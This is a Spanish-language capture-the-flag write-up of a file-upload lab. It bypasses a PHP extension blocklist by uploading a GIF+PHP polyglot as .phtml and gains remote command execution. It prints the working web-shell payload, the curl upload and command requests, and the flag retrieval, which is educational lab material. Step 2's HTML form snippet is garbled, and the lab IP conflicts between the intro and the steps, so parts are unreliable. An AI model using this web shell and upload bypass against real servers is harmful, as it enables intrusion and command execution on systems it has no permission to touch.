# Carga de evidencias

> Bandeja de evidencias de campo. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
>
> `chmod +x startlab.sh`
> `./startlab.sh blackout-web05.tar`
>
> El script muestra la IP del laboratorio (172.18.0.2). Enumera con nmap y ataca por HTTP. No expongas el contenedor a internet.
>
> **Consejo:** enumera la IP del lab con nmap. Hay una bandeja para archivar evidencias de campo.

**Flag:** `WHOAMI{up10ad_3v1d3nc14}`

---

## Resolución

El lab es una app web con una **bandeja de evidencias** (`/carga.php`) que permite subir el "registro fotográfico" del turno. El reto gira en torno a esa subida de archivos: si el filtro no está bien hecho, se puede convertir en ejecución remota de comandos (RCE).

### 1. Levantar el lab y enumerar

**Herramienta:** `docker inspect` + `nmap`. **Por qué:** obtengo la IP del contenedor y los servicios a los que atacar.

**Parámetros de nmap:** `-sV` (versión del servicio) y `-p-` (todos los puertos).

```bash
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web05
172.17.0.2

$ nmap -sV 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

Solo el puerto 80 → el ataque es por HTTP.

### 2. Explorar la app y localizar la subida

En el menú aparece `/carga.php`, un formulario de subida de archivos con `accept="image/post" action="/carga.php" enctype="multipart/form-data">
  <input type="file" name="evidencia" accept="image/submit">Subir evidencia</button>
</form>
```

### 3. Inspeccionar la validación del servidor

**Herramienta:** `docker exec` (acceso al contenedor). **Por qué:** ver el código de `carga.php` para entender qué valida antes de intentar un bypass.

```bash
$ sudo docker exec blackout-web05 cat /var/www/html/carga.php
```

La lógica de validación:

- Bloquea nombres con `.htaccess` o extensiones `php|php3|php4|php5|phar`.
- Exige `Content-Type: image/...` (prefijo `image/`).
- Exige que el archivo pase `getimagesize()` (debe ser una imagen válida).

```php
$bloqueada = preg_match('/htaccess/i', $orig) || preg_match('/\.(php|php3|php4|php5|phar)(\.|$)/i', $orig);
if ($orig === '' || $bloqueada || strncmp($ctype, 'image/', 6) !== 0 || @getimagesize($tmp) === false) { ... }
```

### 4. Encontrar la vía de bypass

**Herramienta:** revisar la configuración de Apache. **Por qué:** el blocklist solo cubre `.php` y variantes, pero Apache puede ejecutar otras extensiones como PHP según su `SetHandler`.

```bash
$ sudo docker exec blackout-web05 cat /etc/apache2/conf-available/zzz-portal.conf
<FilesMatch "\.(phtml|php7|pht)$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

**Lo que vi:** Apache ejecuta como PHP las extensiones `.phtml`, `.php7` y `.pht` — **ninguna está en el blocklist** del servidor. La vía es subir un `.phtml` que sea a la vez una imagen válida (para pasar `getimagesize`) y contenga código PHP.

### 5. Crear y subir el poliglota GIF+PHP

**Herramienta:** `python3` + `curl`. **Por qué:** construyo un GIF 1×1 válido (bytes de cabecera que `getimagesize` reconoce) y le añado un payload PHP al final; al servirse como `.phtml`, PHP lo ejecuta.

```bash
$ python3 -c "
gif = open('/tmp/base.gif','rb').read()
open('/tmp/evidencia.phtml','wb').write(gif + b'<?php system(\$_GET[\"c\"]); ?>')
"
$ file /tmp/evidencia.phtml
GIF image data, version 89a, 1 x 1     # pasa getimagesize
```

Subir indicando `type=image/gif`:

```bash
$ curl -F "evidencia=@evidencia.phtml;type=image/gif" http://172.17.0.2/carga.php
<div class="alert">Registro archivado. <a href="/evidencias/evidencia.phtml">Abrir evidencia</a></div>
```

### 6. Ejecutar comandos (RCE)

Accediendo al archivo subido con el parámetro `c`:

```bash
$ curl "http://172.17.0.2/evidencias/evidencia.phtml?c=id"
uid=33(www-data) gid=33(www-data)
```

**RCE confirmado.** A partir de aquí busco la flag.

### 7. Localizar y leer la flag

**Herramienta:** `find` / `ls` en ubicaciones típicas de la app. **Por qué:** en retos anteriores de este lab la flag vive en archivos `.dat` bajo `/var/lib/latam`.

```bash
$ curl "http://172.17.0.2/evidencias/evidencia.phtml?c=ls /var/lib/latam"
evidencia.dat  nodo.cache  turno.log
```

`evidencia.dat` contiene el registro con la flag en **base64**:

```bash
$ curl "http://172.17.0.2/evidencias/evidencia.phtml?c=cat /var/lib/latam/evidencia.dat"
REGISTRO=V0hPQU1Je3VwMTBhZF8zdjFkM25jMTR9

$ echo "V0hPQU1Je3VwMTBhZF8zdjFkM25jMTR9" | base64 -d
WHOAMI{up10ad_3v1d3nc14}
```

## Lección

Una subida de archivos que valida `getimagesize()` pero no limita qué extensiones ejecuta Apache es vulnerable: `.phtml`/`.php7`/`.pht` no suelen estar en el blocklist y se interpretan como PHP. Un poliglota (GIF válido + payload PHP) combina ambas cosas y da RCE.